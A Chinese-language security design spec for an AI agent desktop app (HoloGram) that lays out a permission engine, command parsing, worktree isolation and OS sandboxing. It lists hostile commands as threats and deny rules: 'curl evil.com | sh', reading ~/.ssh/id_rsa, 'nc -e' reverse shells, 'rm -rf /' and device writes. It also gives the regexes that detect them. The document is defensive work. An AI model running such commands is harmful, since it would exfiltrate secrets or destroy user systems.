# Security Spec: 沙箱 + 权限引擎 + Agent 隔离

> 当前状态：有一个路径守卫 (`sandbox.rs`, 203 行)，不在真正危险的门上。
> 目标：Agent 做什么都先过三道门 — 规则引擎 → 命令解析 → OS 沙箱。

---

## 目录

1. [当前系统 = 漏勺](#1-当前系统--漏勺)
2. [纵深防御模型](#2-纵深防御模型)
3. [Layer 1: 命令解析器](#3-layer-1-命令解析器)
4. [Layer 2: 权限引擎](#4-layer-2-权限引擎)
5. [Layer 3: Agent 隔离](#5-layer-3-agent-隔离)
6. [Layer 4: OS 沙箱](#6-layer-4-os-沙箱)
7. [实现路径](#7-实现路径)
8. [不做什么](#8-不做什么)

---

## 1. 当前系统 = 漏勺

### 1.1 现状

```
                    ┌──────────────────────────┐
                    │      Agent (TypeScript)    │
                    └──────┬──────────────────────┘
                           │
        ┌──────────────────┼──────────────────────────────────┐
        │                  │                                  │
   ┌────▼─────────┐  ┌────▼──────────────┐  ┌────────────────▼───────────────┐
   │ exec_command  │  │ read_file_content │  │ edit_file / list_directory     │
   │               │  │ write_file_content│  │ glob / search_content          │
   │ NO SANDBOX    │  │ delete_file_or_dir│  │ create_directory / rename      │
   │ rm -rf / ✔️   │  │                   │  │ git_* (14 个) / log_append     │
   │ curl | sh ✔️  │  │ ✅ check_read /   │  │                                │
   │ cat ~/.ssh ✔️ │  │   check_write     │  │ NO SANDBOX（全部裸奔）          │
   └───────────────┘  └───────────────────┘  └────────────────────────────────┘
```

Sandbox 只在 **3 个工具** 上介入：`read_file_content`（`check_read`）、`write_file_content`（`check_write`）、`delete_file_or_dir`（`check_write`）。检查内容也只有一个：路径是否在 project_root 内。

**其余所有文件/命令/git 工具完全不经过沙箱**。实测 main.rs：

| Tauri command | sandbox 检查 | 裸奔能力 |
|---------------|-------------|---------|
| `exec_command` | 无 | 任意 shell |
| `edit_file` | 无（读+写都不走） | 改任意文件内容 |
| `list_directory` | 无 | 列任意目录 |
| `glob` | 无 | walkdir 任意目录 |
| `search_content` | 无 | 跨目录读内容 |
| `create_directory` | 无 | 任意建目录 |
| `rename_file_or_dir` | 无 | 任意移动文件 |
| `log_append` | 无 | 写任意路径 |
| `git_*`（14 个） | 无 | push/pull/commit/checkout/branch 任意的 repo |
| `read_file_content` | ✅ check_read | — |
| `read_file_base64` | ✅ check_read | — |
| `write_file_content` | ✅ check_write | — |
| `delete_file_or_dir` | ✅ check_write | — |

### 1.2 致命缺口

| 攻击面 | 当前防护 | 后果 |
|--------|---------|------|
| Agent 执行任意 shell 命令 | 无 | `rm -rf /`、`curl evil.com \| sh`、修改系统文件 |
| Agent 改任意文件（edit_file） | **无** | `edit_file("/etc/passwd", ...)` 直接改，不过任何检查 |
| Agent 读敏感文件 | exec_command 无；read_file_content 仅 project_root 前缀 | `exec_command("cat ~/.ssh/id_rsa")` 绕过；`search_content("/home/user/.ssh", ...)` 绕过 |
| Agent 列/搜任意目录 | **无** | `glob("**/*", "/home")`、`list_directory("C:\\Windows\\System32")` 全量泄露 |
| Agent 任意 git 操作 | **无** | `git_push` 外泄代码、`git_commit --amend` 篡改历史、`git_checkout` 丢工作区 |
| Agent 通过网络外泄 | 仅 `is_private_ip` | 读文件内容 → curl POST 到外部服务器 |

### 1.3 根因

**把沙箱误解为"路径守卫"而不是"执行环境容器"。**

路径守卫防的是"写错文件"。沙箱要防的是"Agent 做不该做的事"——这是两个完全不同的问题。

---

## 2. 纵深防御模型

### 2.1 原则

**每一层独立裁决。任何一层拒绝 = 操作被阻止。所有层通过 = 操作允许。**

没有单层是银弹：
- 权限规则可能配错 → 命令解析器兜底
- 命令解析器可能漏 → OS 沙箱兜底
- OS 沙箱可能被绕过 → Agent 隔离限制了杀伤范围

### 2.2 架构：两层自治 + 纵深防御

参考 Claude Code 的真实架构（不是臆想）：**权限引擎不做一刀切，工具自己裁决自己的语义，引擎只做编排和粗粒度规则**。原因是 BashTool 的子命令拆分/env var 剥离/AST 解析跟 FileEditTool 的路径 glob 匹配/symlink 解析**完全不同**——塞进一个中央函数要么变巨大 switch，要么把工具语义泄漏进引擎。

```
Agent 请求: tool_call(exec_command, {command: "rm -rf /tmp/build"})
           │
     ┌─────▼──────────────────────────────────────────────────────┐
     │ 中央入口: has_permission_to_use_tool(tool, input, ctx)     │
     │                                                            │
     │ ① 整工具级 Deny 规则: get_deny_rule(tool)                   │
     │    "Bash" in always_deny? → Deny                           │
     │                                                            │
     │ ② 整工具级 Ask 规则: get_ask_rule(tool)                     │
     │    "Bash" in always_ask? → Ask（除非 sandbox 可 auto-allow）│
     │                                                            │
     │ ③ 工具自治裁决: tool.check_permissions(input, ctx)          │ ← 关键
     │    BashTool → bash_permissions::check                      │
     │      → tree-sitter AST 解析（或正则兜底）                    │
     │      → 子命令拆分 → 每个子命令过 deny/ask/allow 规则         │
     │      → 危险模式检测 → readOnly 判断                         │
     │    FileEditTool → filesystem::check_write_permission        │
     │      → 路径 glob 匹配 deny 规则                             │
     │      → safety_check (.git/.hologram/.ssh bypass-immune)     │
     │      → ask 规则 → acceptEdits mode → allow 规则             │
     │    GlobTool → filesystem::check_read_permission（复用）     │
     │    GitTool → check_write_permission(repo path) + git 子命令 │
     │                                                            │
     │ ④ safetyCheck bypass-immune: 即便 ③ 返回 allow，            │
     │    safety_check 仍可升级为 ask（.git/.hologram/.ssh 等）     │
     │                                                            │
     │ ⑤ 模式裁决: bypass/auto/acceptEdits/default                 │
     │    bypass → allow（但 ①②④ 仍拦截）                          │
     │    acceptEdits → working dir 内写 allow                     │
     │    default → passthrough 转 ask                             │
     │                                                            │
     │ ⑥ 整工具级 Allow 规则: tool_always_allowed(tool)            │
     │    "Bash" in always_allow? → Allow                         │
     │                                                            │
     │ ⑦ 无规则命中 → passthrough → ask                            │
     └─────┬────────────────────────────────────────────────────┘
           │ Allow
     ┌─────▼────────────────────────────────────────────────────┐
     │ Agent 隔离 (Layer 3, 见 §5)                                │
     │ worktree 模式 → map_path → 路径映射到 worktree 副本          │
     └─────┬────────────────────────────────────────────────────┘
           │
     ┌─────▼────────────────────────────────────────────────────┐
     │ OS 沙箱 (Layer 4, 见 §6)                                   │
     │ Windows: Job Object + AppContainer                        │
     │ macOS: sandbox-exec                                        │
     │ Linux: bubblewrap                                          │
     └─────┬────────────────────────────────────────────────────┘
           │
     ┌─────▼────────────────────────────────────────────────────┐
     │ 执行                                                       │
     └──────────────────────────────────────────────────────────┘
```

### 2.3 裁决优先级

```
① 整工具 Deny        最高优先，立即拒绝
② 整工具 Ask         强制弹窗（除非 sandbox auto-allow）
③ 工具自治裁决       tool.check_permissions() 内部：
   ├─ 内容级 Deny 规则   （如 Bash("rm:*") deny）
   ├─ safetyCheck        bypass-immune，.git/.hologram/.ssh 强制 ask
   ├─ 内容级 Ask 规则    （如 Bash("git push --force") ask）
   ├─ 内容级 Allow 规则  （如 Bash("npm test:*") allow）
   └─ 默认 passthrough
④ 模式裁决           bypass > acceptEdits > default
⑤ 整工具 Allow       放行
⑥ passthrough → ask  兜底弹窗
```

要点：
- **Deny 永远在最前**——无论整工具级还是内容级，Deny 不可被下游覆盖。
- **safetyCheck 是独立层，不是规则**——即使用户配了 `WriteFile(".git/**") Allow`，safetyCheck 仍强制 Ask。这是不可覆盖的安全策略，不是 System 层规则（Claude Code 的做法，比我们原来的"System Deny 规则"更干净）。
- **工具自治是核心**——引擎不解析 bash 命令、不匹配路径 glob，这些在工具的 `check_permissions` 里做。引擎只编排。

规则显式 > 自动检测 > 自动放行。越危险越靠前。

---

## 3. BashTool 命令解析（工具内部模块）

### 3.1 定位变更

原 spec 把命令解析器当成独立层（Layer 1）。新架构里它是 **BashTool 的内部模块**——只有 `exec_command` 走它，FileEditTool/GlobTool/GitTool 不需要命令解析。这跟 Claude Code 的 `bashPermissions.ts`（10 万行，只在 BashTool 内部）一致。

### 3.2 两个阶段

**阶段 A：正则提取（Phase 1 就做）**

tokenize → 操作类型查表 → 路径提取 → 危险模式正则。覆盖 90% 常见命令。

```
1. tokenize: 按空白切 + 识别引号边界 → tokens[0]=command, tokens[1..]=args
2. 操作类型: 由 tokens[0] 查表决定
3. 路径提取: 只对 tokens[1..] 做正则匹配

路径提取 (仅对参数 token):
  - 绝对路径: /[\w./-]+
  - 相对路径: (?:\.\/|\.\.\/)?[\w./-]+
  - 家目录: ~/[\w./-]+
  - Windows: [A-Z]:\\[\w.\\-]+

操作类型 (由 tokens[0] 决定):
  - READ:   cat, head, tail, less, ls, grep, find, stat, file, wc, du, df
  - WRITE:  >, >>, tee, touch, mkdir
  - DELETE: rm, rmdir, unlink, del
  - MOVE:   mv, cp, rename
  - EXEC:   bash, sh, zsh, python, node, ./, source, eval, exec
  - NETWORK: curl, wget, nc, telnet, ssh, scp, rsync, git (push/pull/clone)
  - PERMISSION: chmod, chown, sudo, su
```

**阶段 B：tree-sitter AST（Phase 2+，需要时加）**

Claude Code 用 tree-sitter-bash 做 AST 解析，能处理复杂管道、嵌套引号、heredoc、命令替换。关键设计：**AST 解析出"太复杂"的命令直接 Ask**——不试图完整模拟 shell 语义，而是把不可静态分析的命令降级为需用户确认。Rust binding：`tree-sitter` + `tree-sitter-bash` crate。

这是 Claude Code 最聪明的设计之一：与其写一个永远有漏洞的 shell 语义模拟器，不如承认"看不懂的命令就问用户"。

### 3.3 危险模式检测

独立于路径提取。这些模式无论路径在哪都触发：

| 模式 | Severity | 检测 |
|------|----------|------|
| `rm -rf /` 或 `rm -rf /*` | Critical | `rm\s.*-r.*-f\s+/(\*)?` |
| `curl/wget ... \| sh/bash` | Critical | `curl.*\|.*(?:sh\|bash)` 等 |
| `dd of=/dev/*` | Critical | `dd\s+of=/dev/` |
| `> /dev/*` | Critical | `>\s*/dev/` |
| `mkfs*` / `shutdown*` / `reboot*` / `halt*` | Critical | 前缀匹配 |
| `eval` / `exec` / `source` | High | 关键词匹配 |
| `sudo` / `su` | High | 关键词匹配 |
| `git push --force main/master` | High | `push.*--force.*(?:main\|master)` |
| `nc -e` / `nc -c` 反向 shell | Critical | `nc\s+.*-e` |
| `chmod 777` 在系统目录 | High | `chmod\s+777` |

```rust
enum Danger {
    ForceRecursiveRoot,      // rm -rf /
    CurlPipeShell,           // curl | sh
    EvalExec,                // eval / exec / source
    PrivilegeEscalation,     // sudo / su
    DeviceWrite,             // > /dev/sda 或 dd of=/dev/sd*
    ReverseShell,            // nc -e /bin/sh
    ChmodWorldWritable,      // chmod 777
    GitForcePushDefault,     // git push -f main
    DownloadsAndExecutes,    // wget ... && ./binary
    DiskFormat,              // mkfs*
    SystemShutdown,          // shutdown/reboot/halt
}

enum Severity { Critical, High }

impl Danger {
    fn severity(&self) -> Severity {
        match self {
            // Critical = 立即 Deny：不可逆的系统性破坏
            Self::ForceRecursiveRoot | Self::DeviceWrite | Self::ReverseShell
            | Self::CurlPipeShell | Self::DiskFormat | Self::SystemShutdown
              => Severity::Critical,
            // High = 默认 Ask：高风险但可逆，用户可显式 Allow 覆盖
            _ => Severity::High,
        }
    }
}
```

### 3.4 数据结构

```rust
struct ParsedCommand {
    raw: String,
    base_command: String,          // "rm"
    subcommands: Vec<String>,      // 拆分后的子命令（管道/&&/||）
    paths: Vec<ParsedPath>,        // extracted paths
    operations: Vec<Operation>,    // READ | WRITE | DELETE | EXEC | NETWORK
    danger_signals: Vec<Danger>,   // Critical/High 分级
    redirections: Vec<Redirect>,   // stdout/stderr redirect targets
    is_pipeline: bool,
    has_subshell: bool,
    too_complex: bool,             // AST 解析失败 → 直接 Ask
}

struct ParsedPath {
    raw: String,           // "/tmp/build"
    expanded: PathBuf,     // canonicalized
    kind: PathKind,        // Absolute | Relative | HomeDir | WindowsDrive
    exists: bool,
}
```

### 3.5 不做

- 不做完整 shell 语义模拟——AST 解析"太复杂"的命令直接 Ask（Claude Code 同款策略）
- 不做变量展开——`$VAR` 命令标记 `too_complex=true` → Ask
- 不做 bash 脚本内的控制流分析——同上，too_complex → Ask

---

## 4. 权限系统：两层自治架构

### 4.1 核心设计

参考 Claude Code 的真实架构（`permissions.ts` + 各 Tool 的 `checkPermissions`）：

**中央入口编排，工具自治裁决。**

- 中央入口 `has_permission_to_use_tool()` 做**整工具级**的 deny/ask/allow + 模式裁决——不解析命令、不匹配路径 glob。
- 每个工具自己实现 `check_permissions()` 做**内容级**裁决——BashTool 解析命令，FileEditTool 匹配路径 glob，GitTool 检查子命令。
- 共享 helper `check_read_permission()` / `check_write_permission()` 被多个工具复用（ReadFile/Glob/Grep 都调 read，WriteFile/EditFile/Delete 都调 write）。
- `safety_check()` 是独立层，bypass-immune——即便工具返回 allow，safety_check 仍可升级为 ask。

### 4.2 Tool trait

每个 Tauri command 对应一个 Tool 实现，自描述权限语义：

```rust
trait Tool {
    fn name(&self) -> &str;                          // "exec_command"、"edit_file"
    fn get_path(&self, input: &Value) -> Option<PathBuf>;  // 操作的文件路径（文件类工具）
    fn is_read_only(&self, input: &Value) -> bool;   // 读操作不弹 write 确认
    fn is_destructive(&self, input: &Value) -> bool; // 删除/覆盖操作默认 Ask
    fn requires_user_interaction(&self) -> bool;     // 即便 bypass 模式也要弹窗
    
    /// 工具自治裁决。中央入口在整工具级 deny/ask 之后调用。
    /// 返回 Passthrough 表示"本工具无特殊意见，交给引擎兜底"。
    fn check_permissions(
        &self,
        input: &Value,
        ctx: &PermissionContext,
    ) -> PermissionResult;
}

enum PermissionResult {
    Allow,
    Deny { reason: String },
    Ask { reason: String, suggestions: Vec<PermissionUpdate> },
    Passthrough,  // 工具无意见 → 引擎按模式/规则兜底
}
```

**工具实现清单**：

| Tool | check_permissions 实现 | 共享 helper |
|------|------------------------|-------------|
| `read_file_content` / `read_file_base64` | 调 `check_read_permission(path)` | filesystem.rs |
| `write_file_content` | 调 `check_write_permission(path)` | filesystem.rs |
| `edit_file` | 调 `check_write_permission(path)`（先读后写，但权限只检查 write 级） | filesystem.rs |
| `delete_file_or_dir` | 调 `check_write_permission(path)` | filesystem.rs |
| `create_directory` | 调 `check_write_permission(path)` | filesystem.rs |
| `rename_file_or_dir` | 调 `check_write_permission(from)` + `check_write_permission(to)` | filesystem.rs |
| `log_append` | 调 `check_write_permission(path)` | filesystem.rs |
| `list_directory` | 调 `check_read_permission(path)` | filesystem.rs |
| `glob` | 调 `check_read_permission(path)` | filesystem.rs |
| `search_content` | 调 `check_read_permission(directory)` | filesystem.rs |
| `exec_command` | 调 `bash_permissions::check(command)` | bash.rs |
| `git_*`（14 个） | 调 `check_write_permission(repo_path)` + git 子命令规则 | filesystem.rs + git.rs |
| `web_fetch` | 域名规则 + SSRF 检查 | web.rs |

### 4.3 规则模型

规则用字符串存储（Claude Code 同款），格式 `"ToolName(content)"`：

```rust
struct PermissionRule {
    source: RuleSource,       // 这条规则哪来的
    behavior: Behavior,       // Allow | Deny | Ask
    value: RuleValue,         // 工具名 + 可选内容
}

struct RuleValue {
    tool_name: String,        // "Bash"、"Read"、"Edit"、"Git"
    content: Option<String>,  // "npm test:*"、"src/**"、"push:*"
}

enum Behavior { Allow, Deny, Ask }

enum RuleSource {
    System,      // 内置硬编码（.hologram/ 不可写等）
    Project,     // .hologram/permissions.json
    User,        // ~/.hologram/permissions.json
    Session,     // 弹窗"总是允许"添加的会话级规则
}
```

**规则字符串格式**：
- `"Bash"` — 整工具级，匹配所有 Bash 调用
- `"Bash(npm test:*)"` — 内容级，前缀匹配 `npm test ...` 命令
- `"Read(src/**)"` — 内容级，glob 匹配 `src/` 下所有文件
- `"Edit(.git/config)"` — 内容级，精确路径
- `"Git(push:*)"` — 内容级，匹配所有 git_push 调用

**tool_name 用 PascalCase**（跟 Claude Code 对齐）：`Bash`、`Read`、`Edit`、`Git`、`WebFetch`。Tauri command 是 snake_case，映射表见 4.8。

### 4.4 规则优先级

```
① 整工具 Deny (System > Project > User > Session)
② 整工具 Ask
③ 工具 check_permissions() 内部：
   ├─ 内容级 Deny 规则
   ├─ safetyCheck (bypass-immune)
   ├─ 内容级 Ask 规则
   ├─ 内容级 Allow 规则
   └─ Passthrough
④ 模式裁决: bypass > acceptEdits > default
⑤ 整工具 Allow
⑥ Passthrough → Ask (兜底)
```

**复合排序 key**：`(tier_rank, scope_specificity_desc, behavior_rank)`
- tier: System(0) > Project(1) > User(2) > Session(3)
- scope_specificity: 非通配字符越多越具体（`"src/secret.rs"` > `"src/**"` > `"**"`）
- behavior: Deny(0) > Ask(1) > Allow(2)

**要点**：
- **Deny 永远最前**——无论整工具级还是内容级，Deny 不可被下游覆盖。
- **safetyCheck 是独立层，不是规则**——即使用户配了 `Edit(.git/**) Allow`，safetyCheck 仍强制 Ask。这是不可覆盖的安全策略。比原来的"System 层 Deny 规则"更干净——规则可以被同层更具体的规则覆盖，safetyCheck 不会。
- **High 级危险可被显式 Deny 升级、不可被 Allow 降级**：若用户配了 `Bash(git push --force main) Deny`，即便 Danger=High 也是 Deny；若配了 Allow，High 仍升级为 Ask。

### 4.5 safetyCheck（bypass-immune 独立层）

```rust
struct SafetyCheckResult {
    safe: bool,
    message: String,
    classifier_approvable: bool,  // 是否可被 auto 模式分类器处理
}

fn check_path_safety(path: &Path) -> SafetyCheckResult {
    // 1. Windows 可疑路径模式（NTFS ADS、8.3 短名、长路径前缀、尾随点、DOS 设备名）
    if has_suspicious_windows_path_pattern(path) { return unsafe(...); }
    
    // 2. HoloGram 配置文件（.hologram/settings.json、.hologram/commands/、.hologram/agents/）
    if is_hologram_config_path(path) { return unsafe(...); }
    
    // 3. 危险文件（.bashrc、.zshrc、.gitconfig、.mcp.json 等）
    if is_dangerous_file(path) { return unsafe(...); }
    
    // 4. 危险目录（.git、.vscode、.idea、.hologram —— 但 .hologram/worktrees/ 豁免）
    if is_dangerous_dir(path) { return unsafe(...); }
    
    safe
}
```

**bypass-immune**：这个检查在 `has_permission_to_use_tool()` 的第 ④ 步独立运行，**在工具返回 Allow 之后仍可升级为 Ask**。即使用户配了 `Edit(.git/**) Allow` 或开了 bypass 模式，safetyCheck 仍强制 Ask。

**worktree 豁免**：`.hologram/worktrees/` 路径豁免 `.hologram` 危险目录检查（Claude Code 同款：`.claude/worktrees/` 豁免 `.claude` 检查）。这是结构性豁免，不是规则——safetyCheck 内部判断 `if path_segments[i] == ".hologram" && path_segments[i+1] == "worktrees" { break; }`。

### 4.6 中央入口

```rust
fn has_permission_to_use_tool(
    tool: &dyn Tool,
    input: &Value,
    ctx: &PermissionContext,
) -> PermissionDecision {
    // ① 整工具级 Deny
    if let Some(rule) = get_deny_rule_for_tool(ctx, tool) {
        return Deny { reason: rule.explain() };
    }

    // ② 整工具级 Ask（除非 sandbox 可 auto-allow bash）
    if let Some(rule) = get_ask_rule_for_tool(ctx, tool) {
        if !can_sandbox_auto_allow(tool, input) {
            return Ask { reason: rule.explain(), .. };
        }
        // sandbox 可 auto-allow → 继续到工具自治裁决
    }

    // ③ 工具自治裁决
    let tool_result = tool.check_permissions(input, ctx);
    match tool_result {
        Deny { .. } => return tool_result,
        Ask { .. } if tool.requires_user_interaction() => return tool_result,
        Ask { decision_reason: SafetyCheck(..), .. } => return tool_result,  // bypass-immune
        Ask { decision_reason: Rule(ask_rule), .. } => return tool_result,   // 内容级 ask
        _ => {}  // Allow 或 Passthrough 继续
    }

    // ④ 模式裁决
    match ctx.mode {
        BypassPermissions => return Allow { .. },  // ①②④ 仍拦截
        AcceptEdits if path_in_working_dir(tool, input, ctx) => return Allow { .. },
        _ => {}
    }

    // ⑤ 整工具级 Allow
    if let Some(rule) = tool_always_allowed(ctx, tool) {
        return Allow { .. };
    }

    // ⑥ Passthrough → Ask
    Ask { reason: "此操作需要批准", .. }
}
```

### 4.7 filesystem.rs（共享 helper）

`check_read_permission` 和 `check_write_permission` 是被工具调用的函数，不是引擎调工具。多个工具复用同一套路径规则匹配逻辑：

```rust
/// 读权限检查：ReadFile/Glob/Grep/SearchContent 共用
fn check_read_permission(
    tool: &dyn Tool,
    input: &Value,
    ctx: &PermissionContext,
) -> PermissionDecision {
    let path = tool.get_path(input)?;
    let paths_to_check = get_paths_for_permission_check(path);  // 含 symlink 解析

    // 1. UNC 路径拦截
    // 2. Windows 可疑路径模式
    // 3. READ 级 Deny 规则（路径 glob 匹配）
    // 4. READ 级 Ask 规则
    // 5. Edit access implies read（write allow → read allow）
    // 6. Working dir 内 → Allow
    // 7. 内部可读路径（session-memory、plans、tool-results）
    // 8. READ 级 Allow 规则
    // 9. 默认 Ask（路径在 working dir 外）
}

/// 写权限检查：WriteFile/EditFile/Delete/CreateDir/Rename 共用
fn check_write_permission(
    tool: &dyn Tool,
    input: &Value,
    ctx: &PermissionContext,
) -> PermissionDecision {
    let path = tool.get_path(input)?;
    let paths_to_check = get_paths_for_permission_check(path);

    // 1. WRITE 级 Deny 规则
    // 2. 内部可写路径（plan 文件、scratchpad）
    // 3. .hologram session allow 例外（skill scope）
    // 4. safetyCheck（bypass-immune）—— .git/.hologram/.ssh 等强制 Ask
    // 5. WRITE 级 Ask 规则
    // 6. acceptEdits mode + working dir → Allow
    // 7. WRITE 级 Allow 规则
    // 8. 默认 Ask
}
```

**glob 匹配用 `ignore` crate**（Claude Code 用 npm 的 `ignore` 库，Rust 有同名 crate）。路径规范化为 POSIX 格式再匹配，跨平台一致。

### 4.8 工具名映射表

PascalCase enum ↔ snake_case Tauri command：

| Tauri command | Tool trait name | 共享 helper | 现状 sandbox |
|---------------|----------------|-------------|-------------|
| `read_file_content` / `read_file_base64` | `Read` | check_read_permission | ✅ |
| `write_file_content` | `Edit` | check_write_permission | ✅ |
| `edit_file` | `Edit` | check_write_permission | ❌ Phase 1 补 |
| `delete_file_or_dir` | `Edit` | check_write_permission | ✅ |
| `create_directory` | `Edit` | check_write_permission | ❌ Phase 1 补 |
| `rename_file_or_dir` | `Edit` | check_write_permission（双路径） | ❌ Phase 1 补 |
| `log_append` | `Edit` | check_write_permission | ❌ Phase 1 补 |
| `list_directory` | `Read` | check_read_permission | ❌ Phase 1 补 |
| `glob` | `Read` | check_read_permission | ❌ Phase 1 补 |
| `search_content` | `Read` | check_read_permission | ❌ Phase 1 补 |
| `exec_command` | `Bash` | bash_permissions::check | ❌ Phase 1 补 |
| `git_*`（14 个） | `Git` | check_write_permission + git 子命令 | ❌ Phase 1 补 |
| `web_fetch` | `WebFetch` | 域名规则 + SSRF | ✅ |

**关键归类**：
- `Read` = 读文件内容 + 列目录 + 搜文件（语义相同：读路径）。用户可"允许读 src/ 但禁止 glob /home"。
- `Edit` = 写/改/删文件 + 建目录 + 重命名（语义相同：改路径）。
- `Bash` = shell 命令（走 bash_permissions）。
- `Git` = git 子命令（结构化，不走 bash 解析）。
- `WebFetch` = HTTP 请求（域名规则）。

### 4.9 内置规则（System 层）

```json
{
  "deny": [
    "Edit(.hologram/**)",
    "Edit(.git/config)",
    "Edit(.git/hooks/**)",
    "Edit(~/.ssh/authorized_keys)",
    "Edit(~/.bashrc)",
    "Edit(~/.zshrc)",
    "Edit(~/.profile)",
    "Bash(rm -rf /*)",
    "Bash(curl * | sh)",
    "Bash(curl * | bash)",
    "Bash(wget * | sh)",
    "Bash(wget * | bash)",
    "Bash(> /dev/*)",
    "Bash(dd of=/dev/*)",
    "Bash(mkfs*)",
    "Bash(shutdown*)",
    "Bash(reboot*)",
    "Bash(halt*)"
  ],
  "ask": [
    "Bash(git push --force main)",
    "Bash(git push --force master)",
    "Git(push)",
    "Git(pull)",
    "Git(checkout:*)",
    "Git(commit)",
    "Git(stage:*)",
    "Git(create_branch:*)",
    "WebFetch(localhost:*)",
    "WebFetch(127.0.0.1:*)"
  ],
  "deny_webfetch": [
    "WebFetch(0.0.0.0:*)"
  ]
}
```

**worktree 豁免**：safetyCheck 内部豁免 `.hologram/worktrees/`（见 4.5），不靠规则排序。比原来的"加 Allow 规则 + scope_specificity 排序"更干净——结构性豁免不会被规则覆盖。

### 4.10 弹窗交互

当裁决 = `Ask` 时，前端弹窗显示：

```
┌─────────────────────────────────────────────────┐
│  Agent 请求执行:                                  │
│                                                  │
│  $ rm -rf /tmp/build                             │
│                                                  │
│  操作: DELETE                                    │
│  影响路径: /tmp/build                             │
│  危险级别: ⚠️ 中等                                │
│                                                  │
│  [ 允许本次 ]  [ 总是允许 rm -rf /tmp/* ]  [ 拒绝 ] │
│                                                  │
│  □ 记住本次会话                                   │
└─────────────────────────────────────────────────┘
```

"总是允许" → `PermissionUpdate { type: addRules, rules: [...], destination: session }`，写入 Session 层 Allow 规则。

### 4.11 后台任务覆盖

`exec_command` 的 `run_in_background: true` 分支**必须走同一套权限检查**。Ask 裁决在后台分支直接降级为 Deny——后台任务异步返回，无法阻塞等用户点击。

用户想后台跑某命令，必须先在前台允许一次（写入 Session Allow 规则），之后该命令的后台调用才会命中 Allow。

### 4.12 审计集成

项目已有 `src-tauri/src/audit.rs`。**权限引擎内嵌审计**——不在每个工具里调，在 `has_permission_to_use_tool()` 内部统一调，保证不漏。

| 事件 | 记录内容 |
|------|---------|
| Deny（整工具级或内容级） | timestamp, tool, input_summary, rule_source, reason |
| Ask + 用户响应 | timestamp, tool, input_summary, user_choice, session_rule_added? |
| safetyCheck 触发 | timestamp, path, check_type, classifier_approvable |
| 后台任务降级 Deny | timestamp, command, reason |
| Worktree 路径映射 | timestamp, original_path, mapped_path, agent_id |

**不审计**：Allow 裁决（高频，只在 debug 模式开）。

### 4.13 并发模型

Tauri 命令是 async 并发的——多 Agent 会话同时调权限检查，弹窗"总是允许"会改规则。

```rust
use std::sync::RwLock;

pub struct PermissionContext {
    rules: RwLock<PermissionRules>,   // 按 source 分桶的规则集
    mode: RwLock<PermissionMode>,
    working_dirs: RwLock<WorkingDirs>,
}

struct PermissionRules {
    allow: HashMap<RuleSource, Vec<String>>,   // source → rule strings
    deny: HashMap<RuleSource, Vec<String>>,
    ask: HashMap<RuleSource, Vec<String>>,
}
```

**RwLock 不是 Mutex**——check 是高频读、低频写，多 Agent 并发 check 不互斥。`has_permission_to_use_tool()` 持读锁期间不得调 `add_session_rule()`（死锁规避）。

### 4.14 不做

- 不做基于 prompt 的 LLM 分类器（Claude Code 用 Haiku 对命令做实时 classify）。那是优化手段，不是基础架构。规则引擎先跑通。
- 不做规则学习/推荐（"上次你允许了 3 次，要不要加规则？"）。YAGNI，等用户抱怨弹窗太多再说。

---

## 5. Layer 3: Agent 隔离

### 5.1 目标

给 Agent 一个"沙盘"——它随便搞，搞砸了不影响主工作区。

### 5.2 两种隔离级别

| 级别 | 机制 | 场景 |
|------|------|------|
| **None** | 直接在主 repo 操作，受权限引擎 + OS 沙箱保护 | 简单查询、读取分析 |
| **Worktree** | git worktree 副本，Agent 只碰副本 | 代码修改任务、批量重构 |

### 5.3 Worktree 生命周期

```
用户: "Agent, 帮我把所有 unwrap() 换成 ?"
  → Agent 启动, isolation=Worktree
    → git worktree add .hologram/worktrees/agent-{id} --detach
    → Agent cwd = .hologram/worktrees/agent-{id}
    → Agent 做修改...
  → Agent 完成
    → git diff --stat (检查改动)
    → 如果无改动: git worktree remove (清理)
    → 如果有改动:
      → 通知用户: "Agent 修改了 12 个文件。"
      → 用户选择: [合并到主分支] [查看 diff] [丢弃]
```

### 5.4 实现要点

```rust
struct AgentIsolation {
    kind: IsolationKind,
    worktree_path: Option<PathBuf>,   // worktree 路径
    worktree_branch: Option<String>,  // worktree 所在分支
    original_head: String,            // 创建 worktree 时的 HEAD commit
}

enum IsolationKind {
    None,
    Worktree,
}

impl AgentIsolation {
    fn create_worktree(slug: &str) -> Result<Self> {
        // git worktree add --detach .hologram/worktrees/{slug}
        // 记录 HEAD commit
        // 返回 Isolation 对象
    }

    fn cleanup(&self) -> Result<CleanupResult> {
        // 检查是否有改动 → git diff --stat HEAD
        // 无改动 → git worktree remove
        // 有改动 → 保留, 返回 CleanupResult::HasChanges
    }

    fn map_path(&self, path: &Path) -> PathBuf {
        // 把主 repo 路径映射到 worktree 内的对应路径
        // /project/src/main.rs → .hologram/worktrees/agent-xxx/src/main.rs
    }
}
```

### 5.5 Worktree slug 验证

跟 Claude Code 一样，防止路径穿越：

```rust
fn validate_slug(slug: &str) -> Result<()> {
    // 长度限制
    if slug.len() > 64 { bail!("too long"); }
    // 每个 segment 只允许 [a-zA-Z0-9._-]
    for seg in slug.split('/') {
        if seg == "." || seg == ".." { bail!("no traversal"); }
        if !seg.chars().all(|c| c.is_alphanumeric() || c == '.' || c == '_' || c == '-') {
            bail!("invalid char");
        }
    }
    Ok(())
}
```

### 5.6 和权限系统的关系

Worktree 隔离 **不替代** 权限系统。Agent 在 worktree 内仍然过 `has_permission_to_use_tool()` → 工具自治裁决 → OS 沙箱。Worktree 只是限制了**杀伤范围**：就算所有防线都穿了你丢的也只是一份副本。

**规则匹配的路径方向**：工具的 `check_permissions` 做 glob 匹配时，**必须用映射回主 repo 的路径**，不是 worktree 内的物理路径。

```
Agent 写: .hologram/worktrees/agent-abc/src/main.rs  (物理路径)
  ↓ map_path 反向映射
匹配用:   src/main.rs                                  (主 repo 相对路径)
  ↓ 用户规则: Edit("src/**") Allow
裁决: Allow ✓
```

如果用物理路径匹配，用户配的 `src/**` 永远不命中 `.hologram/worktrees/agent-abc/src/**`——权限系统在 worktree 模式下形同虚设。`map_path` 必须双向：执行时正向映射（主 repo → worktree），裁决时反向映射（worktree → 主 repo）。

**worktree 写入豁免**：safetyCheck 内部豁免 `.hologram/worktrees/`（见 4.5），不是靠规则。Agent 在 worktree 里的写操作经反向映射后变成 `src/**` 等业务路径，由用户规则裁决；worktree 元数据目录本身（`.git`、worktree 的 config）仍受 safetyCheck 保护。

### 5.7 不做

- 不做 remote agent（Claude Code 的 `isolation: "remote"`，给 CCR 用的）
